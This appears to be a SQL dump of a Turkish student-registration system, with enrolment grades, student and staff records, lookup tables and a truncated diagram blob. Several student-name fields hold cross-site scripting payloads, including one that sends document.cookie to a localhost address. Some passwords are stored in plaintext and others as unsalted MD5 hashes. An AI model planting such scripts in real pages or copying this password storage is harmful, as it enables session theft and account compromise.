INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '328', '000050', '10000000012', '999', '999', '12', 'Başarısız', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '329', '000050', '00000000004', '999', '999', '111', 'Devamsız', NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '330', '000044', '10000000009', '999', '999', '999', NULL, NULL, '2011-09-16', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '331', '000045', '10000000001', '999', '999', '999', NULL, NULL, '2011-09-19', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '332', '000045', '10000000002', '999', '999', '999', NULL, NULL, '2011-09-19', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '333', '000045', '00000000001', '999', '999', '999', NULL, NULL, '2011-09-19', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '334', '000048', '10000000003', '999', '999', '999', NULL, NULL, '2011-09-27', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '335', '000048', '10000000005', '999', '999', '999', NULL, NULL, '2011-09-27', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '336', '000048', '10000000001', '999', '999', '999', NULL, NULL, '2011-09-27', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '337', '000039', '10000000008', '999', '999', '999', NULL, NULL, '2011-09-27', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '338', '000039', '10000000010', '999', '999', '999', NULL, NULL, '2011-09-27', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '339', '000039', '10000000005', '999', '999', '999', NULL, NULL, '2011-09-27', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '340', '000039', '10000000001', '999', '999', '999', NULL, NULL, '2011-09-27', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '341', '000039', '10000000002', '999', '999', '999', NULL, NULL, '2011-09-27', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '342', '000039', '00000000021', '999', '999', '999', NULL, NULL, '2011-09-27', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '343', '000039', '00000000062', '999', '999', '999', NULL, NULL, '2011-09-27', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '347', '000052', '10000000005', '222', '222', '88', 'Başarılı', NULL, '2011-10-07', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '348', '000052', '00000000001', '222', '222', '99', 'Başarılı', NULL, '2011-10-07', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '353', '000052', '00000000008', '222', '222', '222', NULL, NULL, '2012-12-13', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '354', '000052', '00000000041', '222', '222', '222', NULL, NULL, '2012-12-13', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '355', '000052', '00000000061', '222', '222', '222', NULL, NULL, '2012-12-13', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '356', '000052', '10000000006', '222', '222', '222', NULL, NULL, '2012-12-13', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '362', '000052', '00000000062', '222', '222', '222', NULL, NULL, '2012-12-13', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '363', '000052', '10000000002', '222', '222', '222', NULL, NULL, '2012-12-13', 'Bilinmiyor' );
INSERT INTO `ogrencikayit`(`ogrenciKayitID`,`dersNo`,`ogrenciNo`,`not1`,`not2`,`ortalama`,`sonuc`,`devam`,`kayitTarihi`,`aciklama`) VALUES ( '365', '000052', '10000000011', '222', '222', '222', NULL, NULL, '2012-12-15', 'Bilinmiyor' );
-- ---------------------------------------------------------


-- Dump data of "ogrenciler" -------------------------------
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '', '', '', 'd41d8cd98f00b204e9800998ecf8427e', '', 'Girilmemiş', 'Girilmemiş', 'Girilmemiş', NULL, '00', '940', NULL, NULL, 'Yok', 'G', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '00000000001', 'Ayşe', 'Demirr', 'a7f4e18520f1a28fb9b1edb53f9fd6b6', '', 'ad@a.com', 'Hasan', 'Bilinmiyor', '0000-00-00', '34', '409', '0000-00-00', NULL, 'Yok', 'K', '0', '0' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '00000000003', 'Hasan', 'Çelik', 'hasancelik', '', 'hc@a.com', 'Hasan', 'Bilinmiyor', NULL, '01', '001', '0000-00-00', NULL, 'aciklama', 'E', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '00000000004', 'Tamer', 'Yorulmaz', 'e1e6205a7c630320a8f854df101905fb', '', 'ty@a.comm', 'Yılmaz', 'Bilinmiyor', '1975-05-01', '01', '008', '2011-05-26', NULL, 'Yok', 'E', '0', '0' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '00000000008', 'Ayşe', 'Eren', 'e78c265a4f809993ccb24c6ea5c308dc', '', 'aer@a.com', 'Mustafa', 'Konya', '1994-06-07', '42', '560', '2011-06-06', NULL, '', 'K', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '00000000009', 'Ayşe', 'Yılmaz', '9693bb4495eae586d84e2001f1d665ac', '', 'ay@a.com', 'Ahmet', 'Kocaeli', '1999-05-01', '41', '533', '2011-05-26', NULL, 'Bilinmiyor', 'K', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '00000000021', 'Ayten', 'Gül', '035e15c85c630a56ebfd9d44f7796da1', '1234567892', 'Girilmemiş', 'Girilmemiş', 'Gebze', '1993-09-01', '00', '940', '2011-09-12', '5', 'Bilinmiyor', 'K', '4', '0' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '00000000041', 'Ayşe', 'Meteee', '94b592cfd868a1e6c8d70d836b7aade0', '', 'Girilmemiş', 'Girilmemiş', 'Bilinmiyor', '1994-06-01', '03', '026', '2011-06-06', NULL, 'Bilinmiyor', 'K', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '00000000061', 'Ahmet', 'Meteee', '9c285d744cc297a717c14a7f918deeb8', '3456565656', 'Girilmemiş', 'Girilmemiş', 'Bilinmiyor', '0000-00-00', '00', '940', '0000-00-00', '0', 'Bilinmiyor', 'E', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '00000000062', 'Buse', 'Yılmaz', 'ae28fe45152c26c9ff2608fb7dfca64d', '3456789123', 'Girilmemiş', 'Girilmemiş', 'bolum', '1996-09-02', '00', '940', '2011-09-12', '5', 'Bilinmiyor', 'K', '8', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '00000000111', '<script> window.location=\'http://localhost/?cookie=\'+document.cookie </script>', 'x', '415290769594460e2e485922904f345d', '122131', 'Girilmemiş', 'Girilmemiş', 'Girilmemiş', NULL, '00', '940', NULL, NULL, 'Yok', 'G', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '10000000001', 'Ayla', 'Mert', '42bf6175cfa9cd1486653179569cb10c', '5053032323', 'Girilmemiş', 'Girilmemiş', 'Bilinmiyor', '0000-00-00', '00', '940', '0000-00-00', '0', 'Bilinmiyor', 'K', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '10000000002', 'Aylin', 'Mert', '2ebd77ffd5463daa1f55620defa89c3c', '5053032323', 'Girilmemiş', 'Girilmemiş', 'Bilinmiyor', '0000-00-00', '00', '940', '0000-00-00', '0', 'Bilinmiyor', 'K', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '10000000003', 'e', 'Mert', 'b6695848a22e162c5abb493d9f4583c8', '5053032323', 'Girilmemiş', 'Girilmemiş', 'Bilinmiyor', '0000-00-00', '00', '940', '0000-00-00', '0', 'Bilinmiyor', 'E', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '10000000004', 'Ayhan', 'Mert', '8edc5485602b71d1a939b5239f719f74', '5053032323', 'Girilmemiş', 'Girilmemiş', 'Bilinmiyor', '0000-00-00', '00', '940', '0000-00-00', '0', 'Bilinmiyor', 'E', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '10000000005', 'Ayhan', 'Metin', '7c064883cf91819986026da9c4d420f0', '5053032323', 'Girilmemiş', 'Girilmemiş', 'Bilinmiyor', '0000-00-00', '00', '940', '0000-00-00', '0', 'Bilinmiyor', 'E', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '10000000006', 'Ayhan', 'Mete', '704a61e1660f5a4b65457f7b9d887e68', '5053032323', 'Girilmemiş', 'Girilmemiş', 'Bilinmiyor', '0000-00-00', '00', '940', '0000-00-00', '0', 'Bilinmiyor', 'E', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '10000000007', 'Aydın', 'Mete', 'e12b2500edf1c14735863d074146da13', '5053032323', 'Girilmemiş', 'Girilmemiş', 'Bilinmiyor', '0000-00-00', '00', '940', '0000-00-00', '0', 'Bilinmiyor', 'E', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '10000000008', 'Aydın', 'Aymaz', '4089c90d768512aaa9d75f03cd572ed7', '5053032323', 'Girilmemiş', 'Girilmemiş', 'Bilinmiyor', '0000-00-00', '00', '940', '0000-00-00', '0', 'Bilinmiyor', 'E', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '10000000009', 'Aydınay', 'Aymaz', 'f0fbd4d9cf7c760db1fc8c45c32bcbe0', '5053032323', 'Girilmemiş', 'Girilmemiş', 'Bilinmiyor', '0000-00-00', '00', '940', '0000-00-00', '0', 'Bilinmiyor', 'E', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '10000000010', 'Aydınay', 'Aygün', 'dcb4f4cddd2dc06724d4bd40ce4134a5', '5053032323', 'Girilmemiş', 'Girilmemiş', 'Bilinmiyor', '0000-00-00', '00', '940', '0000-00-00', '0', 'Bilinmiyor', 'E', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '10000000011', 'Aydın', 'Aygün', '6e988acfce94d3fb55cea02100258424', '5053032323', 'Girilmemiş', 'Girilmemiş', 'Bilinmiyor', '0000-00-00', '00', '940', '0000-00-00', '0', 'Bilinmiyor', 'E', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '10000000012', 'Selim', 'Aygün', '9e11a26d3e4912e6740cfcffe7bddf9c', '5053032323', 'Girilmemiş', 'Girilmemiş', 'Bilinmiyor', '0000-00-00', '00', '940', '0000-00-00', '0', 'Bilinmiyor', 'E', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '2435243534', '<script>alert(\'xyz\');</script>', 'x', 'e369853df766fa44e1ed0ff613f563bd', '34', 'Girilmemiş', 'Girilmemiş', 'Girilmemiş', NULL, '00', '940', NULL, NULL, 'Yok', 'G', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '30682832620', 'Zeynep', 'Beyza', '3018e19a0704c62935d6df6df8e1c73c', '1234567891', 'cc@a.com', 'Yılmaz', 'Bilinmiyor', '1976-09-27', '33', '408', '2011-05-24', '0', 'Bilinmiyor', 'E', '0', '0' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( '34324', '<script>alert(\'slm\')</script>', '', 'd41d8cd98f00b204e9800998ecf8427e', '', 'Girilmemiş', 'Girilmemiş', 'Girilmemiş', NULL, '00', '940', NULL, NULL, 'Yok', 'G', '0', '1' );
INSERT INTO `ogrenciler`(`ogrenciNo`,`adi`,`soyadi`,`sifre`,`telefonNo`,`eposta`,`babaAdi`,`adres`,`dogumTarihi`,`il`,`ilce`,`kayitTarihi`,`ogrenimDurumu`,`aciklama`,`cinsiyet`,`zamanDilimi`,`aktif`) VALUES ( 'asdfas', '', '', 'd41d8cd98f00b204e9800998ecf8427e', '', 'Girilmemiş', 'Girilmemiş', 'Girilmemiş', NULL, '00', '940', NULL, NULL, 'Yok', 'G', '0', '1' );
-- ---------------------------------------------------------


-- Dump data of "ogrenimdurumu" ----------------------------
INSERT INTO `ogrenimdurumu`(`ogrenimNo`,`ogrenimDurumu`) VALUES ( '0', 'Girilmemiş' );
INSERT INTO `ogrenimdurumu`(`ogrenimNo`,`ogrenimDurumu`) VALUES ( '1', 'Okur Yazar' );
INSERT INTO `ogrenimdurumu`(`ogrenimNo`,`ogrenimDurumu`) VALUES ( '2', 'İlkokul' );
INSERT INTO `ogrenimdurumu`(`ogrenimNo`,`ogrenimDurumu`) VALUES ( '3', 'İlköğretim' );
INSERT INTO `ogrenimdurumu`(`ogrenimNo`,`ogrenimDurumu`) VALUES ( '4', 'Lise' );
INSERT INTO `ogrenimdurumu`(`ogrenimNo`,`ogrenimDurumu`) VALUES ( '5', 'Önlisans' );
INSERT INTO `ogrenimdurumu`(`ogrenimNo`,`ogrenimDurumu`) VALUES ( '6', 'Lisans' );
INSERT INTO `ogrenimdurumu`(`ogrenimNo`,`ogrenimDurumu`) VALUES ( '7', 'Yüksek Lisans' );
INSERT INTO `ogrenimdurumu`(`ogrenimNo`,`ogrenimDurumu`) VALUES ( '8', 'Doktora' );
-- ---------------------------------------------------------


-- Dump data of "oturumbilgileri" --------------------------
INSERT INTO `oturumbilgileri`(`session_id`,`ip_address`,`user_agent`,`last_activity`,`user_data`) VALUES ( '906481b005be4bb9da842d4f212355f8', '127.0.0.1', 'Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/201001', '1355558135', '' );
-- ---------------------------------------------------------


-- Dump data of "personel" ---------------------------------
INSERT INTO `personel`(`personelNo`,`sicilNo`,`adi`,`soyadi`,`sifre`,`eposta`,`cinsiyet`,`babaAdi`,`grup`,`adres`,`il`,`ilce`,`dogumTarihi`,`kayitTarihi`,`aciklama`) VALUES ( '00000000001', '44556', 'Mertt', 'Korkmazt', 'LecturePassword', 'mk@gmail.com', 'E', 'ali', '2', 'karabük', '41', '537', '1999-05-01', '2011-05-27', 'aciklamaaaa' );
INSERT INTO `personel`(`personelNo`,`sicilNo`,`adi`,`soyadi`,`sifre`,`eposta`,`cinsiyet`,`babaAdi`,`grup`,`adres`,`il`,`ilce`,`dogumTarihi`,`kayitTarihi`,`aciklama`) VALUES ( '00000000002', '2222', 'Ayla', 'Has', 'LecturePassword', 'Girilmemiş', 'E', 'Ahmet', '1', 'Bilinmiyor', '22', '276', '0000-00-00', '0000-00-00', 'Bilinmiyor' );
INSERT INTO `personel`(`personelNo`,`sicilNo`,`adi`,`soyadi`,`sifre`,`eposta`,`cinsiyet`,`babaAdi`,`grup`,`adres`,`il`,`ilce`,`dogumTarihi`,`kayitTarihi`,`aciklama`) VALUES ( '00000000021', '0', 'Mehmet', 'Yılmaz', '035e15c85c630a56ebfd9d44f7796da1', 'Girilmemiş', 'E', 'Girilmemiş', '1', 'Bilinmiyor', '06', '064', '1994-06-01', '2011-06-06', 'Bilinmiyor' );
INSERT INTO `personel`(`personelNo`,`sicilNo`,`adi`,`soyadi`,`sifre`,`eposta`,`cinsiyet`,`babaAdi`,`grup`,`adres`,`il`,`ilce`,`dogumTarihi`,`kayitTarihi`,`aciklama`) VALUES ( '11111111111', '0', 'Alparslan', 'Yorulmaz', 'adbc91a43e988a3b5b745b8529a90b61', 'ba@com', 'E', 'Yılmaz', '2', 'kocaeli', '35', '446', '1984-05-01', '2011-05-27', 'yok.......' );
INSERT INTO `personel`(`personelNo`,`sicilNo`,`adi`,`soyadi`,`sifre`,`eposta`,`cinsiyet`,`babaAdi`,`grup`,`adres`,`il`,`ilce`,`dogumTarihi`,`kayitTarihi`,`aciklama`) VALUES ( '11111111122', '0', 'Ayşe', 'as', '4124bc0a9335c27f086f24ba207a4912', 'ae@a.com', 'K', 'Mehmet', '1', 'Bilinmiyor', '07', '084', '2011-05-27', '2011-05-27', 'Bilinmiyor' );
INSERT INTO `personel`(`personelNo`,`sicilNo`,`adi`,`soyadi`,`sifre`,`eposta`,`cinsiyet`,`babaAdi`,`grup`,`adres`,`il`,`ilce`,`dogumTarihi`,`kayitTarihi`,`aciklama`) VALUES ( '11111111444', '0', 'Melek', 'Şahin', '0d06367f6df598cd0d50f10425d13c22', 'Girilmemiş', 'K', 'Girilmemiş', '2', 'Bilinmiyor', '00', '940', '0000-00-00', '0000-00-00', 'Bilinmiyor' );
-- ---------------------------------------------------------


-- Dump data of "uygunzamandilimi" -------------------------
INSERT INTO `uygunzamandilimi`(`zamanDilimiNo`,`zamanDilimi`) VALUES ( '0', 'Girilmemiş' );
INSERT INTO `uygunzamandilimi`(`zamanDilimiNo`,`zamanDilimi`) VALUES ( '1', 'Hafta içi sabah' );
INSERT INTO `uygunzamandilimi`(`zamanDilimiNo`,`zamanDilimi`) VALUES ( '2', 'Hafta içi öğlen' );
INSERT INTO `uygunzamandilimi`(`zamanDilimiNo`,`zamanDilimi`) VALUES ( '3', 'Hafta içi akşam' );
INSERT INTO `uygunzamandilimi`(`zamanDilimiNo`,`zamanDilimi`) VALUES ( '4', 'Hafta içi tam gün' );
INSERT INTO `uygunzamandilimi`(`zamanDilimiNo`,`zamanDilimi`) VALUES ( '5', 'Hafta sonu sabah' );
INSERT INTO `uygunzamandilimi`(`zamanDilimiNo`,`zamanDilimi`) VALUES ( '6', 'Hafta sonu öğlen' );
INSERT INTO `uygunzamandilimi`(`zamanDilimiNo`,`zamanDilimi`) VALUES ( '7', 'Hafta sonu akşam' );
INSERT INTO `uygunzamandilimi`(`zamanDilimiNo`,`zamanDilimi`) VALUES ( '8', 'Hafta sonu tam gün' );
INSERT INTO `uygunzamandilimi`(`zamanDilimiNo`,`zamanDilimi`) VALUES ( '9', 'Farketmez' );
-- ---------------------------------------------------------


-- Dump data of "vs_database_diagrams" ---------------------
INSERT INTO `vs_database_diagrams`(`name`,`diadata`,`comment`,`preview`,`lockinfo`,`locktime`,`version`) VALUES ( 'obDiagram', 'PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHByb3BlcnRpZXM+Cgk8Q29udHJvbHM+CgkJPFRhYmxlPgoJCQk8UGFyZW50IHZhbHVlPSIjVE9QIi8+CgkJCTxQcm9wZXJ0aWVzPgoJCQkJPF5jaGVja3MgdmFsdWU9IjAiLz4KCQkJCTxeZ3JvdXAgdmFsdWU9Ii0xIi8+CgkJCQk8XmhlaWdodCB2YWx1ZT0iLTEiLz4KCQkJCTxeaW5kZXhlcyB2YWx1ZT0iMCIvPgoJCQkJPF5sZXZlbCB2YWx1ZT0iMiIvPgoJCQkJPF5saW5rcyB2YWx1ZT0iMCIvPgoJCQkJPF5sb2NrIHZhbHVlPSIwIi8+CgkJCQk8Xm1ldGhvZHMgdmFsdWU9IjAiLz4KCQkJCTxebWluaW1pemVkIHZhbHVlPSIwIi8+CgkJCQk8XnByb3BlcnRpZXMgdmFsdWU9IjAiLz4KCQkJCTxedHJpZ2dlcnMgdmFsdWU9IjAiLz4KCQkJCTxedW5pcXVlcyB2YWx1ZT0iMSIvPgoJCQkJPGJhY2tfY29sb3IgdmFsdWU9IkI0RDY0NzAwIi8+CgkJCQk8bmFtZSB2YWx1ZT0iVGFibGUiLz4KCQkJCTxwb3NpdGlvbiB2YWx1ZT0iNDEyOzE3OSIvPgoJCQkJPHNpemUgdmFsdWU9IjI0ODsyNzYiLz4KCQkJPC9Qcm9wZXJ0aWVzPgoJCQk8VHlwZSB2YWx1ZT0iVGFibGUiLz4KCQk8L1RhYmxlPgoJCTxUYWJsZTE+CgkJCTxQYXJlbnQgdmFsdWU9IiNUT1AiLz4KCQkJPFByb3BlcnRpZXM+Cgk